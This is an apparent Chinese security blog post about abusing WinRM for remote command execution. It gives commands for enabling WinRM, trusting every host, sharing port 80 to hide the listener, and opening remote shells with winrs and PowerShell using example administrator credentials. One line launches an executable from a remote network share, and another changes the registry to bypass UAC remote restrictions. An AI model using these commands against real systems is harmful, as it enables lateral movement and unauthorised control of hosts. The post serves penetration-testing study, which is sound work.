<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>0x04 Winrm利用 [ Breezy_Struggle ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><link rel="stylesheet" href="/css/screen.css"><link rel="stylesheet" href="/css/tag.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script><script src="https://cdn.bootcss.com/lazysizes/5.1.0/lazysizes.min.js"></script><script>$("img").attr({"class":"lazyload"});



</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Breezy_Struggle" type="application/atom+xml">
</head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Breezy's Blog</a></div><article id="post"><h1 id="postTitle">0x04 Winrm利用</h1><p>WinRM(Windows Remote Management)远程管理，是一种允许管理员远程执行系统管理任务的服务。基于Powershell,通过HTTP（5985）或HTTPS SOAP（5986）执行通信，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。</p>
<blockquote>
<p>使用此服务需要管理员级别凭据<br>双方都需要开启winrm(Win7开始支持，Server12后默认开启)</p>
</blockquote>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--开启--</span><br><span class="line">winrm quickconfig -q   启动服务并设置为自启动 添加防火墙例外规则 添加监听配置</span><br><span class="line">或</span><br><span class="line">Powershell下  Enable-PSRemoting -Force</span><br><span class="line"></span><br><span class="line">--配置--</span><br><span class="line">winrm get winrm&#x2F;config 获取配置信息</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125; 配置信任管理源</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;&quot;&#125;  删除信任</span><br><span class="line">winrm e winrm&#x2F;config&#x2F;listener  查看监听设置</span><br><span class="line"></span><br><span class="line">winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;true&quot;&#125;   启用80端口复用</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;false&quot;&#125;  关闭</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;80&quot;&#125;  修改默认监听端口为80</span><br></pre></td></tr></table></figure>
<p>开启端口复用主要利用IIS自带驱动<code>http.sys</code>的端口共享功能Port Sharing。所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh http show  servicestate  查看注册的url前缀</span><br></pre></td></tr></table></figure>


<h3 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h3><ul>
<li><p>Winrs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http:&#x2F;&#x2F;192.168.1.152:5985 -u:administrator -p:admin123 &quot;whoami &#x2F;all&quot; # 执行单条命令</span><br><span class="line">winrs -r:http:&#x2F;&#x2F;192.168.1.152:5985 -u:administrator -p:admin123 cmd # 返回交互式cmd</span><br></pre></td></tr></table></figure>
</li>
<li><p>Powershell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ip&#x3D;&quot;192.168.1.116&quot;</span><br><span class="line">#$ip&#x3D;&quot;192.168.1.20&quot;</span><br><span class="line">Set-Item WSMan:\localhost\Client\TrustedHosts -Value $ip -Force</span><br><span class="line">$securePassword &#x3D; ConvertTo-SecureString -AsPlainText -Force &#39;pass&#39;</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential &#39;pass&#39;, $securePassword</span><br><span class="line">$cmd &#x3D; &#123;ls C:\users\public&#125;</span><br><span class="line">Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock $cmd</span><br><span class="line"></span><br><span class="line">Enter-PSSession -ComputerName 192.168.100.155 -Credential administrator 返回交互式shell</span><br></pre></td></tr></table></figure></li>
<li><p>Winrm </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm -hostname remote.domain.com -username &quot;Administrator&quot; -password &quot;secret&quot; &quot;ipconfig &#x2F;all&quot;</span><br><span class="line">winrm invoke create wmicimv2&#x2F;win32_process @&#123;commandline&#x3D;&quot;\\192.168.12.20\c\luomiweixiong.exe&quot;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>HTTP Server API</p>
</li>
</ul>
<h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><p>通过修改注册表使得除了<code>administrator</code>之外的本地管理用户能够直接绕过UAC通过Winrm进行高权限管理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure></article><div id="paginator"></div><div id="toc"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Breezy </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj" target="_blank" rel="noopener"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script src="/js/meizj.js"></script><script>//- $(window).on('load', function(){ 
$('pre').addClass('prettyprint linenums');
prettyPrint();
//- });
$(".gutter").remove();</script></body></html>